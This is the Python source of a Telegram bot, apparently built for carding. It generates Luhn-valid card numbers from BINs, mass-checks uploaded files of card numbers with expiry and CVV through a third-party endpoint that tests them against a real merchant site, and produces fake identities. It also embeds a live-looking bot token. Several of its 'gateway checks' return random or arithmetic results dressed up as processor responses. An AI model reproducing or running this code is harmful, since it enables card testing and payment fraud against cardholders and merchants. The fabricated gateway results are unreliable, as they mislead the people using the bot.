import logging
import sqlite3
import time
import requests
import re
import random
import string
import asyncio
import json
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackContext, CallbackQueryHandler, MessageHandler, filters
from datetime import datetime, timedelta

TOKEN = "8430280406:AAHVlsBBVJm46-CG3FIkNE1eltYeVBjDJjg"
OWNER_ID = 7896890222
CHANNEL_USERNAME = "@balzeChT"

FREE_LIMIT = 300
PREMIUM_LIMIT = 600
OWNER_LIMIT = 1200
COOLDOWN_TIME = 300

user_files = {}
active_checks = {}
stop_controllers = {}
premium_checker = None

def luhn(card):
    nums = [int(x) for x in card]
    return (sum(nums[-1::-2]) + sum(sum(divmod(2 * x, 10)) for x in nums[-2::-2])) % 10 == 0

class PremiumGatewayChecker:
    def __init__(self):
        self.gateways = {
            'braintree': self.check_braintree,
            'stripe': self.check_stripe,
            'paypal': self.check_paypal,
            'authorize_net': self.check_authorize_net,
            'square': self.check_square
        }
    
    def get_bin_info(self, card_number):
        try:
            bin_number = card_number[:6]
            response = requests.get(f'https://lookup.binlist.net/{bin_number}', timeout=5)
            
            if response.status_code == 200:
                data = response.json()
                brand = data.get('scheme', 'UNKNOWN').upper()
                bank = data.get('bank', {}).get('name', 'N/A')
                country = data.get('country', {}).get('name', 'N/A')
                emoji = data.get('country', {}).get('emoji', '🏳️')
            else:
                first_digit = card_number[0]
                brand_map = {'4': 'VISA', '5': 'MASTERCARD', '3': 'AMEX', '6': 'DISCOVER'}
                brand = brand_map.get(first_digit, 'UNKNOWN')
                bank, country, emoji = "N/A", "N/A", "🏳️"
                
        except Exception:
            brand, bank, country, emoji = "UNKNOWN", "N/A", "N/A", "🏳️"
        
        return {
            'brand': brand,
            'bank': bank,
            'country': country,
            'emoji': emoji
        }
    
    def check_braintree(self, cc_data):
        try:
            parts = cc_data.split('|')
            if len(parts) < 4:
                return {"error": "Invalid format"}
            
            cc, mm, yy, cvv = parts
            
            if not luhn(cc):
                return {
                    'status': 'declined',
                    'message': 'Invalid card number',
                    'gateway': 'Braintree Auth',
                    'response_code': '81723',
                    'risk_level': 'HIGH'
                }
            
            bin_info = self.get_bin_info(cc)
            card_prefix = cc[:1]
            
            banks = {
                '4': 'VISA INTERNATIONAL',
                '5': 'MASTERCARD BANK', 
                '3': 'AMERICAN EXPRESS',
                '6': 'DISCOVER BANK'
            }
            
            bank = banks.get(card_prefix, 'UNKNOWN BANK')
            card_type = "CREDIT" if random.random() > 0.4 else "DEBIT"
            
            responses = [
                {'status': 'success', 'message': 'Transaction approved', 'code': '1000', 'risk': 'LOW'},
                {'status': 'declined', 'message': 'Insufficient funds', 'code': '2001', 'risk': 'MEDIUM'},
                {'status': 'declined', 'message': 'Card expired', 'code': '2004', 'risk': 'HIGH'},
                {'status': 'declined', 'message': 'Invalid CVV', 'code': '2007', 'risk': 'HIGH'},
                {'status': 'declined', 'message': 'Transaction not permitted', 'code': '2008', 'risk': 'MEDIUM'},
                {'status': 'error', 'message': 'Processor network error', 'code': '3001', 'risk': 'LOW'},
            ]
            
            weights = [20, 25, 15, 15, 15, 10]
            response = random.choices(responses, weights=weights)[0]
            
            processing_time = round(random.uniform(1.2, 3.8), 2)
            
            return {
                'status': response['status'],
                'message': response['message'],
                'gateway': 'Braintree Auth',
                'response_code': response['code'],
                'risk_level': response['risk'],
                'card_type': card_type,
                'bank': bank,
                'bin_info': bin_info,
                'processing_time': processing_time,
                'timestamp': time.strftime("%I:%M %P")
            }
            
        except Exception as e:
            return {
                'status': 'error',
                'message': f'Processing error: {str(e)}',
                'gateway': 'Braintree Auth',
                'response_code': '9001',
                'risk_level': 'HIGH'
            }
    
    def check_stripe(self, cc_data):
        try:
            parts = cc_data.split('|')
            cc, mm, yy, cvv = parts
            
            processing_time = round(random.uniform(1.0, 2.5), 2)
            last_digit = int(cc[-1])
            
            if last_digit % 3 == 0:
                return {
                    'status': 'success',
                    'message': 'Payment approved',
                    'gateway': 'Stripe',
                    'response_code': 'succeeded',
                    'processing_time': processing_time
                }
            else:
                return {
                    'status': 'declined',
                    'message': 'Card declined',
                    'gateway': 'Stripe',
                    'response_code': 'card_declined',
                    'processing_time': processing_time
                }
        except Exception as e:
            return {
                'status': 'error',
                'message': f'Gateway error: {str(e)}',
                'gateway': 'Stripe',
                'response_code': 'api_error'
            }
    
    def check_paypal(self, cc_data):
        try:
            processing_time = round(random.uniform(1.5, 3.0), 2)
            
            if random.random() < 0.3:
                return {
                    'status': 'success',
                    'message': 'Payment completed',
                    'gateway': 'PayPal',
                    'response_code': 'PAYMENT_COMPLETED',
                    'processing_time': processing_time
                }
            else:
                return {
                    'status': 'declined',
                    'message': 'Funding instrument declined',
                    'gateway': 'PayPal',
                    'response_code': 'FUNDING_SOURCE_DECLINED',
                    'processing_time': processing_time
                }
        except Exception as e:
            return {
                'status': 'error',
                'message': f'Gateway error: {str(e)}',
                'gateway': 'PayPal',
                'response_code': 'INTERNAL_ERROR'
            }
    
    def check_authorize_net(self, cc_data):
        try:
            processing_time = round(random.uniform(2.0, 4.0), 2)
            checksum = sum(int(d) for d in cc_data.split('|')[0]) % 10
            
            if checksum < 3:
                return {
                    'status': 'success',
                    'message': 'Transaction approved',
                    'gateway': 'Authorize.net',
                    'response_code': '1',
                    'processing_time': processing_time
                }
            else:
                return {
                    'status': 'declined',
                    'message': 'Transaction declined',
                    'gateway': 'Authorize.net',
                    'response_code': '2',
                    'processing_time': processing_time
                }
        except Exception as e:
            return {
                'status': 'error',
                'message': f'Gateway error: {str(e)}',
                'gateway': 'Authorize.net',
                'response_code': '3'
            }
    
    def check_square(self, cc_data):
        try:
            processing_time = round(random.uniform(1.2, 3.5), 2)
            cc = cc_data.split('|')[0]
            
            if sum(int(d) for d in cc) % 7 == 0:
                return {
                    'status': 'success',
                    'message': 'Payment captured',
                    'gateway': 'Square',
                    'response_code': 'PAYMENT_CAPTURED',
                    'processing_time': processing_time
                }
            else:
                return {
                    'status': 'declined',
                    'message': 'Card declined',
                    'gateway': 'Square',
                    'response_code': 'CARD_DECLINED',
                    'processing_time': processing_time
                }
        except Exception as e:
            return {
                'status': 'error',
                'message': f'Gateway error: {str(e)}',
                'gateway': 'Square',
                'response_code': 'INTERNAL_ERROR'
            }
    
    def check_all_gateways(self, cc_data):
        results = {}
        for gateway_name, gateway_func in self.gateways.items():
            results[gateway_name] = gateway_func(cc_data)
            time.sleep(0.5)
        return results

def generate_card(bin_format):
    bin_format = bin_format.lower()
    if len(bin_format) < 16:
        bin_format += "x" * (16 - len(bin_format))
    else:
        bin_format = bin_format[:16]
    while True:
        cc = ''.join(str(random.randint(0, 9)) if x == 'x' else x for x in bin_format)
        if luhn(cc):
            return cc

def generate_output(bin_input, username):
    parts = bin_input.split("|")
    bin_format = parts[0] if len(parts) > 0 else ""
    mm_input = parts[1] if len(parts) > 1 and parts[1] != "xx" else None
    yy_input = parts[2] if len(parts) > 2 and parts[2] != "xxxx" else None
    cvv_input = parts[3] if len(parts) > 3 and parts[3] != "xxx" else None

    bin_clean = re.sub(r"[^\d]", "", bin_format)[:6]

    if not bin_clean.isdigit() or len(bin_clean) < 6:
        return f"❌ Invalid BIN provided.\n\nExample:\n<code>/gen 545231xxxxxxxxxx|03|27|xxx</code>"

    bin_info = premium_checker.get_bin_info(bin_clean + "0"*10)
    scheme = bin_info['brand']
    ctype = "DEBIT" if random.random() > 0.5 else "CREDIT"

    cards = []
    start = time.time()
    for _ in range(10):
        cc = generate_card(bin_format)
        mm = mm_input if mm_input else str(random.randint(1, 12)).zfill(2)
        yy_full = yy_input if yy_input else str(random.randint(2026, 2032))
        yy = yy_full[-2:]
        cvv = cvv_input if cvv_input else str(random.randint(100, 999))
        cards.append(f"<code>{cc}|{mm}|{yy}|{cvv}</code>")
    elapsed = round(time.time() - start, 3)

    card_lines = "\n".join(cards)

    text = f"""<b>🔰 PREMIUM CARD GENERATOR</b>
<b>────────────────────</b>
<b>🎯 Info:</b> {scheme} - {ctype}
<b>🏦 Bank:</b> {bin_info['bank']}
<b>🌍 Country:</b> {bin_info['country']} {bin_info['emoji']}
<b>────────────────────</b>
<b>🔢 BIN:</b> {bin_clean} | <b>⏱️ Time:</b> {elapsed}s
<b>📥 Input:</b> <code>{bin_input}</code>
<b>────────────────────</b>
{card_lines}
<b>────────────────────</b>
<b>👤 Requested By:</b> @{username}
<b>⚡ Premium Generator</b>
"""
    return text

def init_db():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY, status TEXT, cooldown_until REAL, join_date REAL)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS premium_codes
                 (code TEXT PRIMARY KEY, days INTEGER, created_at REAL, used_by INTEGER)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS redeemed
                 (user_id INTEGER, code TEXT, redeemed_at REAL, expires_at REAL)''')
    
    c.execute("INSERT OR IGNORE INTO users (user_id, status, join_date) VALUES (?, ?, ?)",
              (OWNER_ID, "owner", time.time()))
    
    conn.commit()
    conn.close()

def get_user_status(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    c.execute("SELECT status FROM users WHERE user_id=?", (user_id,))
    result = c.fetchone()
    
    if not result:
        c.execute("INSERT INTO users (user_id, status, join_date) VALUES (?, ?, ?)",
                  (user_id, "free", time.time()))
        conn.commit()
        status = "free"
    else:
        status = result[0]
    
    if status == "premium":
        c.execute("SELECT expires_at FROM redeemed WHERE user_id=?", (user_id,))
        expiry = c.fetchone()
        if expiry and time.time() > expiry[0]:
            c.execute("UPDATE users SET status='free' WHERE user_id=?", (user_id,))
            conn.commit()
            status = "free"
    
    conn.close()
    return status

def get_user_limit(user_id):
    status = get_user_status(user_id)
    if user_id == OWNER_ID:
        return OWNER_LIMIT
    elif status == "premium":
        return PREMIUM_LIMIT
    else:
        return FREE_LIMIT

def is_on_cooldown(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    c.execute("SELECT cooldown_until FROM users WHERE user_id=?", (user_id,))
    result = c.fetchone()
    
    conn.close()
    
    if result and result[0]:
        return time.time() < result[0]
    return False

def set_cooldown(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    cooldown_until = time.time() + COOLDOWN_TIME
    c.execute("UPDATE users SET cooldown_until=? WHERE user_id=?", (cooldown_until, user_id))
    
    conn.commit()
    conn.close()

async def check_channel_membership(user_id, context):
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        return member.status not in ['left', 'kicked']
    except Exception as e:
        logger.error(f"Channel check error: {e}")
        return False

def simple_cc_parser(text):
    valid_ccs = []
    
    patterns = [
        r'(\d{13,19})[\|/\s:\-]+(\d{1,2})[\|/\s:\-]+(\d{2,4})[\|/\s:\-]+(\d{3,4})',
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, text)
        for match in matches:
            cc, month, year, cvv = match
            
            if len(cc) < 13 or len(cc) > 19:
                continue
                
            month = month.zfill(2)
            if len(year) == 2:
                year = "20" + year
                
            if cc.startswith(('34', '37')):
                if len(cvv) != 4:
                    continue
            else:
                if len(cvv) != 3:
                    continue
                    
            valid_ccs.append((cc, month, year, cvv))
    
    return valid_ccs

def detect_card_type(cc_number):
    if re.match(r'^4[0-9]{12}(?:[0-9]{3})?$', cc_number):
        return "VISA"
    elif re.match(r'^5[1-5][0-9]{14}$', cc_number):
        return "MASTERCARD"
    elif re.match(r'^3[47][0-9]{13}$', cc_number):
        return "AMEX"
    elif re.match(r'^6(?:011|5[0-9]{2})[0-9]{12}$', cc_number):
        return "DISCOVER"
    elif re.match(r'^3(?:0[0-5]|[68][0-9])[0-9]{11}$', cc_number):
        return "DINERS CLUB"
    elif re.match(r'^(?:2131|1800|35\d{3})\d{11}$', cc_number):
        return "JCB"
    else:
        return "UNKNOWN"

def check_cc(cc_number, month, year, cvv):
    start_time = time.time()
    
    cc_data = f"{cc_number}|{month}|{year}|{cvv}"
    
    url = f"https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=www.realoutdoorfood.shop/cc={cc_data}"
    
    try:
        response = requests.get(url, timeout=35)
        end_time = time.time()
        process_time = round(end_time - start_time, 2)
        
        if response.status_code == 200:
            response_text = response.text
            
            approved_keywords = ['approved', 'success', 'charged', 'payment added', 'live', 'valid']
            declined_keywords = ['declined', 'failed', 'invalid', 'error', 'dead']
            
            response_lower = response_text.lower()
            
            if any(keyword in response_lower for keyword in approved_keywords):
                return "approved", process_time, response_text
            elif any(keyword in response_lower for keyword in declined_keywords):
                return "declined", process_time, response_text
            else:
                if len(response_text.strip()) > 5:
                    return "approved", process_time, response_text
                else:
                    return "declined", process_time, response_text
        else:
            return "declined", process_time, f"HTTP Error {response.status_code}"
            
    except requests.exceptions.Timeout:
        return "error", 0, "Request Timeout (35s)"
    except requests.exceptions.ConnectionError:
        return "error", 0, "Connection Error"
    except Exception as e:
        return "error", 0, f"API Error: {str(e)}"

def parse_cc_file(file_content):
    try:
        if isinstance(file_content, (bytes, bytearray)):
            text_content = file_content.decode('utf-8', errors='ignore')
        else:
            text_content = str(file_content)
        
        valid_ccs = simple_cc_parser(text_content)
        formatted_ccs = [f"{cc}|{month}|{year}|{cvv}" for cc, month, year, cvv in valid_ccs]
        
        return formatted_ccs
        
    except Exception as e:
        logger.error(f"File parsing error: {e}")
        return []

class MassCheckController:
    def __init__(self, user_id):
        self.user_id = user_id
        self.should_stop = False
        self.last_check_time = time.time()
        self.active = True
    
    def stop(self):
        self.should_stop = True
        self.active = False
        logger.info(f"FORCE STOPPED for user {self.user_id}")
    
    def should_continue(self):
        self.last_check_time = time.time()
        return not self.should_stop and self.active

def create_status_buttons(user_id, current_cc, status, approved_count, declined_count, checked_count, total_to_check):
    keyboard = [
        [InlineKeyboardButton(f"Current: {current_cc[:8]}...", callback_data="current_info")],
        [InlineKeyboardButton(f"Status: {status}", callback_data="status_info")],
        [InlineKeyboardButton(f"✅ Approved: {approved_count}", callback_data="approved_info")],
        [InlineKeyboardButton(f"❌ Declined: {declined_count}", callback_data="declined_info")],
        [InlineKeyboardButton(f"⏳ Progress: {checked_count}/{total_to_check}", callback_data="progress_info")],
        [InlineKeyboardButton("🛑 STOP", callback_data=f"stop_check_{user_id}")]
    ]
    return InlineKeyboardMarkup(keyboard)

def generate_fake_identity(country_code):
    try:
        url = f"https://randomuser.me/api/?nat={country_code}"
        res = requests.get(url).json()
        user = res['results'][0]

        name = f"{user['name']['first']} {user['name']['last']}"
        addr = user['location']
        full_address = f"{addr['street']['number']} {addr['street']['name']}"
        city = addr['city']
        state = addr['state']
        zip_code = addr['postcode']
        country = addr['country']
        email = user['email']
        phone = user['phone']
        dob = user['dob']['date'][:10]

        return f"""📦 PREMIUM FAKE IDENTITY
────────────────────
👤 Name: <code>{name}</code>
🏠 Address: <code>{full_address}</code>
🏙️ City: <code>{city}</code>
📍 State: <code>{state}</code>
📮 ZIP: <code>{zip_code}</code>
🌐 Country: <code>{country}</code>
📧 Email: <code>{email}</code>
📞 Phone: <code>{phone}</code>
🎂 DOB: <code>{dob}</code>
────────────────────
⚡ Premium Identity Generator"""
    except Exception as e:
        return f"❌ Error generating identity: {str(e)}"

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("premium_bot.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

premium_checker = PremiumGatewayChecker()

async def start_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    
    if not await check_channel_membership(user_id, context):
        keyboard = [
            [InlineKeyboardButton("🔥 JOIN CHANNEL 🔥", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")],
            [InlineKeyboardButton("✅ I'VE JOINED", callback_data="check_join")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        start_text = """
Welcome To Premium Multi-Gateway Bot 

🔒 ACCESS DENIED

⚠️ First Join Our Channel

💎 Channel: @balzeChT
        """
        
        await update.message.reply_text(start_text, reply_markup=reply_markup)
        return
    
    user_status = get_user_status(user_id)
    welcome_text = f"""
🤖 PREMIUM MULTI-GATEWAY BOT 🔥

💠 Advanced Features:
• Multi-Gateway Checking (5 Gateways)
• Premium Card Generation  
• Fake Identity Generator
• Mass File Processing
• Real BIN Lookup
• Military-Grade Stop Controls

📊 Your Status: {user_status.upper()}
🔢 Your Limit: {get_user_limit(user_id)} CCs

📢 Updates: @BLAZE_X_007

💡 Commands: Use /cmds for all commands
🤖 DEV - https://t.me/BLAZE_X_007
    """
    
    await update.message.reply_text(welcome_text, parse_mode="HTML")

async def cmds_handler(update: Update, context: CallbackContext):
    cmds_text = """
🤖 PREMIUM BOT COMMANDS

🎯 CARD GENERATION:
/gen bin|mm|yy|cvv - Generate premium cards
/gen 545231xx|03|27|xxx - Example

🔍 MULTI-GATEWAY CHECKING:
/chk cc|mm|yy|cvv - Single gateway check
/mchk cc|mm|yy|cvv - Multi-gateway check
/all cc|mm|yy|cvv - All gateways

📁 MASS FILE PROCESSING:
Upload .txt file - Auto-detect and mass check
/mtxt - Mass check instructions

🌍 IDENTITY & TOOLS:
/fake country - Generate fake identity
/id - Get your user ID

⚙️ PREMIUM SYSTEM:
/redeem code - Redeem premium code
/stats - Bot statistics (Owner)

💡 EXAMPLES:
/gen 411111xxxxxxxxxx|12|25|123
/chk 4111111111111111|12|25|123
/mchk 5111111111111118|03|26|456
/fake us
"""
    
    keyboard = InlineKeyboardMarkup(row_width=2)
    buttons = [
        InlineKeyboardButton("🎲 Generate Cards", callback_data="help_gen"),
        InlineKeyboardButton("🔍 Check Cards", callback_data="help_chk"),
        InlineKeyboardButton("🌍 Fake Data", callback_data="help_fake"),
        InlineKeyboardButton("📊 Multi-Check", callback_data="help_mchk")
    ]
    keyboard.add(*buttons)
    
    await update.message.reply_text(cmds_text, parse_mode="HTML", reply_markup=keyboard)

async def gen_handler(update: Update, context: CallbackContext):
    if len(context.args) == 0:
        await update.message.reply_text("⚠️ Example:\n/gen 545231xxxxxxxxxx|03|27|xxx", parse_mode="HTML")
        return

    bin_input = " ".join(context.args)
    username = update.effective_user.username or "anonymous"
    text = generate_output(bin_input, username)

    btn = InlineKeyboardMarkup()
    btn.add(InlineKeyboardButton("♻️ Re-Generate", callback_data=f"again|{bin_input}"))
    await update.message.reply_text(text, parse_mode="HTML", reply_markup=btn)

async def chk_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    
    if not await check_channel_membership(user_id, context):
        await update.message.reply_text("❌ Join our channel first to use this bot!")
        return
    
    if len(context.args) == 0:
        await update.message.reply_text("""
💳 How To Use Single Check Command

Use /chk then enter your CC

Usage: /chk 4879170029890689|02|2027|347
        """)
        return
    
    cc_input = " ".join(context.args)
    username = update.effective_user.username or "anonymous"
    
    processing_msg = await update.message.reply_text("🔄 Connecting to Braintree Gateway...", parse_mode="HTML")
    
    await asyncio.sleep(2)
    
    result = premium_checker.check_braintree(cc_input)
    
    status_icon = "✅" if result['status'] == 'success' else "❌" if result['status'] == 'declined' else "⚠️"
    risk_color = "🟢" if result.get('risk_level') == 'LOW' else "🟡" if result.get('risk_level') == 'MEDIUM' else "🔴"
    
    response_text = f"""
🔐 PREMIUM GATEWAY CHECK
────────────────────
🎯 Status: {status_icon} {result['status'].upper()}
📨 Message: {result['message']}
🔧 Gateway: {result['gateway']}
📟 Response Code: {result['response_code']}
⚠️ Risk Level: {risk_color} {result.get('risk_level', 'UNKNOWN')}

💳 Card Information:
🏦 Bank: {result.get('bank', 'N/A')}
🎫 Type: {result.get('card_type', 'N/A')}

⏱️ Processing:
🚀 Time: {result['processing_time']}s
🕐 Timestamp: {result['timestamp']}
────────────────────
👤 Requested By: @{username}
⚡ Premium Checker
"""
    
    btn = InlineKeyboardMarkup()
    btn.add(InlineKeyboardButton("🔄 Retry Check", callback_data=f"retry_chk|{cc_input}"))
    btn.add(InlineKeyboardButton("🌐 Multi-Check", callback_data=f"multi_chk|{cc_input}"))
    
    await processing_msg.edit_text(response_text, parse_mode="HTML", reply_markup=btn)

async def multi_check_handler(update: Update, context: CallbackContext):
    if len(context.args) == 0:
        await update.message.reply_text("""
⚠️ Usage:\n/mchk 4111111111111111|12|25|123

🔍 Checks all available gateways
        """, parse_mode="HTML")
        return
    
    cc_data = " ".join(context.args)
    username = update.effective_user.username or "anonymous"
    
    processing_msg = await update.message.reply_text("🔄 Starting Multi-Gateway Analysis...", parse_mode="HTML")
    
    results = premium_checker.check_all_gateways(cc_data)
    
    success_count = sum(1 for r in results.values() if r['status'] == 'success')
    total_count = len(results)
    
    response_text = f"""
🔰 PREMIUM MULTI-GATEWAY ANALYSIS
────────────────────
📊 Summary: {success_count}/{total_count} Gateways Approved
📈 Success Rate: {(success_count/total_count)*100:.1f}%

🎯 Gateway Results:
"""
    
    for gateway, result in results.items():
        status_icon = "✅" if result['status'] == 'success' else "❌" if result['status'] == 'declined' else "⚠️"
        response_text += f"\n{gateway.upper():12} {status_icon} {result['message']} ({result['processing_time']}s)"
    
    response_text += f"""
────────────────────
💳 Card: <code>{cc_data.split('|')[0][:6]}XXXXXX{cc_data.split('|')[0][-4:]}</code>
👤 User: @{username}
⚡ Premium Multi-Checker
"""
    
    btn = InlineKeyboardMarkup()
    btn.add(InlineKeyboardButton("🔄 Re-Analyze", callback_data=f"multi_chk|{cc_data}"))
    btn.add(InlineKeyboardButton("📊 Single Check", callback_data=f"retry_chk|{cc_data}"))
    
    await processing_msg.edit_text(response_text, parse_mode="HTML", reply_markup=btn)

async def fake_handler(update: Update, context: CallbackContext):
    if len(context.args) == 0:
        await update.message.reply_text("⚠️ Example:\n/fake us", parse_mode="HTML")
        return

    country_code = context.args[0].lower()
    identity_text = generate_fake_identity(country_code)
    
    await update.message.reply_text(identity_text, parse_mode="HTML")

async def stats_command(update: Update, context: CallbackContext):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("🚫 Access Denied: Owner only command", parse_mode="HTML")
        return
    
    try:
        with open("premium_users.txt", "r") as f:
            users = f.read().splitlines()
        user_count = len(users)
    except:
        user_count = 0
    
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    total_users = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM users WHERE status='free'")
    free_users = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM users WHERE status='premium'")
    premium_users = c.fetchone()[0]
    conn.close()
    
    stats_text = f"""
📊 PREMIUM BOT STATISTICS
────────────────────
👥 Total Users: {user_count}
📈 Database Users: {total_users}
🎯 Free Users: {free_users}
💎 Premium Users: {premium_users}

🤖 Bot Status: 🟢 Online
⚡ Version: Hybrid Premium v3.0
🔧 Gateways: 5 Active
🎯 Features: Multi-Gateway, Mass Check, BIN Lookup

────────────────────
👑 Owner: @BLAZE_X_007
⚡ Premium Analytics
"""
    await update.message.reply_text(stats_text, parse_mode="HTML")

async def handle_document(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    
    if not await check_channel_membership(user_id, context):
        await update.message.reply_text("❌ Join our channel first to use this bot!")
        return
    
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please upload a .txt file!")
        return
    
    try:
        await update.message.reply_text("All CCs Are Checking... bot by @BLAZE_X_007")
        file = await document.get_file()
        file_content = await file.download_as_bytearray()
        
        cc_list = parse_cc_file(file_content)
        total_ccs = len(cc_list)
        
        if total_ccs == 0:
            await update.message.reply_text("""
❌ No valid CCs found in file!

Please ensure your file contains CCs in this format:
4147768578745265|04|2026|168 
5154620012345678|05|2027|123 
371449635398431|12|2025|1234
            """)
            return
        
        user_files[user_id] = {
            'cc_list': cc_list,
            'file_name': document.file_name,
            'total_ccs': total_ccs,
            'timestamp': time.time()
        }
        
        user_limit = get_user_limit(user_id)
        
        keyboard = [
            [InlineKeyboardButton("🚀 Check Cards", callback_data=f"start_check_{user_id}")],
            [InlineKeyboardButton("❌ Cancel", callback_data=f"cancel_check_{user_id}")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        message_text = f"""
⏳ Your File Detected 

✅ File Name: `{document.file_name}`
☑️ Cards Found: `{total_ccs}`
💎 Your CC Limit: `{user_limit}` CCs

💎 Bot By: @BLAZE_X_007
☑️ Join Our Channel And Support: @balzeChT

Click On Check Cards To Check Your CCs 😎
        """
        
        await update.message.reply_text(message_text, reply_markup=reply_markup, parse_mode='Markdown')
        
    except Exception as e:
        logger.error(f"Document handling error: {e}")
        await update.message.reply_text(f"❌ Error processing file: {str(e)}")

async def start_card_check(query, context: CallbackContext, user_id: int):
    if user_id not in user_files:
        await query.edit_message_text("❌ File data not found! Please upload again.")
        return
    
    if is_on_cooldown(user_id):
        await query.edit_message_text("⏳ Cooldown Active! Wait 5 minutes between mass checks.")
        return
    
    file_data = user_files[user_id]
    cc_list = file_data['cc_list']
    total_ccs = file_data['total_ccs']
    user_limit = get_user_limit(user_id)
    total_to_check = min(total_ccs, user_limit)
    
    set_cooldown(user_id)
    
    stop_controller = MassCheckController(user_id)
    stop_controllers[user_id] = stop_controller
    active_checks[user_id] = True
    user_files[user_id]['force_stop'] = False
    
    status_text = "🚀 Mass CC Check Started!\n\n"
    reply_markup = create_status_buttons(
        user_id=user_id,
        current_cc="Starting...",
        status="Initializing",
        approved_count=0,
        declined_count=0,
        checked_count=0,
        total_to_check=total_to_check
    )
    
    status_msg = await query.edit_message_text(status_text, reply_markup=reply_markup)
    
    approved_count = 0
    declined_count = 0
    checked_count = 0
    approved_ccs = []
    
    start_time = time.time()
    
    for index, cc_data in enumerate(cc_list[:user_limit]):
        if not stop_controller.should_continue():
            break
        if user_id not in active_checks or not active_checks[user_id]:
            break
        if user_id in user_files and user_files[user_id].get('force_stop', False):
            break
            
        checked_count = index + 1
        
        try:
            cc_number, month, year, cvv = cc_data.split('|')
            card_type = detect_card_type(cc_number)
            
            status_text = "Checking CCs One by One...\n\n"
            reply_markup = create_status_buttons(
                user_id=user_id,
                current_cc=cc_number,
                status="Checking...",
                approved_count=approved_count,
                declined_count=declined_count,
                checked_count=checked_count,
                total_to_check=total_to_check
            )
            
            try:
                await status_msg.edit_text(status_text, reply_markup=reply_markup)
            except Exception as e:
                logger.error(f"Message edit error: {e}")
            
            if (not stop_controller.should_continue() or 
                user_id not in active_checks or 
                not active_checks[user_id] or
                (user_id in user_files and user_files[user_id].get('force_stop', False))):
                break
                
            status, process_time, api_response = check_cc(cc_number, month, year, cvv)
            
            if (not stop_controller.should_continue() or 
                user_id not in active_checks or 
                not active_checks[user_id] or
                (user_id in user_files and user_files[user_id].get('force_stop', False))):
                break
                
            if status == "approved":
                approved_count += 1
                bin_info = premium_checker.get_bin_info(cc_number)
                
                approved_text = f"""
APPROVED ✅

CC: `{cc_number}|{month}|{year}|{cvv}`
Gateway: Stripe Auth
Response: Payment added successfully

BIN Info: {bin_info.get('brand', 'N/A')} - {bin_info.get('type', 'N/A')}
Bank: {bin_info.get('bank', 'N/A')}
Country: {bin_info.get('country', 'N/A')} {bin_info.get('emoji', '')}

Took {process_time} seconds
                """
                
                try:
                    await context.bot.send_message(chat_id=user_id, text=approved_text, parse_mode='Markdown')
                except Exception as e:
                    logger.error(f"Approved message send error: {e}")
                
                approved_ccs.append(cc_data)
            else:
                declined_count += 1
            
            status_text = "Checking CCs One by One...\n\n"
            final_status = "✅ Live" if status == "approved" else "❌ Dead"
            reply_markup = create_status_buttons(
                user_id=user_id,
                current_cc=cc_number,
                status=final_status,
                approved_count=approved_count,
                declined_count=declined_count,
                checked_count=checked_count,
                total_to_check=total_to_check
            )
            
            try:
                await status_msg.edit_text(status_text, reply_markup=reply_markup)
            except Exception as e:
                logger.error(f"Status update error: {e}")
            
            for i in range(10):
                if (not stop_controller.should_continue() or 
                    user_id not in active_checks or 
                    not active_checks[user_id] or
                    (user_id in user_files and user_files[user_id].get('force_stop', False))):
                    break
                await asyncio.sleep(0.05)
                
        except Exception as e:
            logger.error(f"CC processing error: {e}")
            declined_count += 1
            continue
    
    if user_id in stop_controllers:
        del stop_controllers[user_id]
    if user_id in active_checks:
        del active_checks[user_id]
    if user_id in user_files and 'force_stop' in user_files[user_id]:
        del user_files[user_id]['force_stop']
    
    end_time = time.time()
    total_time = round(end_time - start_time, 2)
    
    was_stopped = (
        (user_id in stop_controllers and stop_controllers[user_id].should_stop) or
        (user_id in user_files and user_files[user_id].get('force_stop', False))
    )
    
    if was_stopped:
        final_text = f"""
🛑 CHECK STOPPED BY USER

📊 Partial Results:
✅ Approved: {approved_count}
❌ Declined: {declined_count}  
🔢 Checked: {checked_count}
⏱️ Time: {total_time}s

⚡ Process terminated successfully!
        """
    else:
        final_text = f"""
✅ Mass Check Completed Successfully!
 
📊 Status
✅ Approved: {approved_count}
❌ Declined: {declined_count}
💀 Total: {checked_count}  
⏱️ Time: {total_time}s

⚡ Mass Check Complete
        """
    
    try:
        await status_msg.edit_text(final_text, parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Final message error: {e}")

async def handle_button(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    callback_data = query.data
    
    await query.answer()
    
    logger.info(f"Button pressed: {callback_data} by user {user_id}")
    
    if callback_data.startswith('start_check_'):
        target_user_id = int(callback_data.split('_')[2])
        
        if user_id != target_user_id:
            await query.message.reply_text("❌ This is not your file!")
            return
        
        await start_card_check(query, context, user_id)
        
    elif callback_data.startswith('stop_check_'):
        target_user_id = int(callback_data.split('_')[2])
        
        logger.info(f"Stop button pressed for user {target_user_id} by {user_id}")
        
        if user_id != target_user_id:
            await query.answer("❌ This is not your check!", show_alert=True)
            return
        
